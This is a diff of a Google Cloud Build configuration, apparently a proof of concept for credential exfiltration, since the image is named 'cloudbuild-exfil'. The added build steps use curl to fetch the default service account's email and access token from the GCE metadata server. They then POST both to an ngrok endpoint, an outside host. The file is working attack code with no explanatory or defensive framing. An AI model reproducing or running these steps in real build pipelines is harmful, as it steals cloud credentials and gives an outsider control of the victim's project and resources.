@@ -3,14 +3,24 @@ steps:
   entrypoint: 'curl'
   args: ['http://e1e6f0638177.ngrok.io']
 
-# GET data from a server, specifying an Authorization header.
+# GET service account email address from metadata api
 - name: 'launcher.gcr.io/google/ubuntu1604'
   entrypoint: 'curl'
-  args: ['-o', 'file.out', "--header", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"]
+  args: ['-o', 'email.out', "--header", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"]
 
-# POST information to a server, specifying a Content-type header.
+# POST to email of service account to the configured ngork endpoint
 - name: 'launcher.gcr.io/google/ubuntu1604'
   entrypoint: 'curl'
-  args: ['--header', 'Content-type: application/json"', '--data', '@file.out', 'http://s.ngrok.io']
+  args: ['--header', 'Content-type: application/json"', '--data', '@email.out', 'http://e1e6f0638177.ngrok.io']
+  
+# GET service accoutn token from metadata api
+- name: 'launcher.gcr.io/google/ubuntu1604'
+  entrypoint: 'curl'
+  args: ['-o', 'token.out', "--header", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"]
+
+  # POST to token of service account to the configured ngork endpoint
+- name: 'launcher.gcr.io/google/ubuntu1604'
+  entrypoint: 'curl'
+  args: ['--header', 'Content-type: application/json"', '--data', '@token.out', 'http://e1e6f0638177.ngrok.io']
 
 images: ['gcr.io/cloudbuild-exfil/curl']
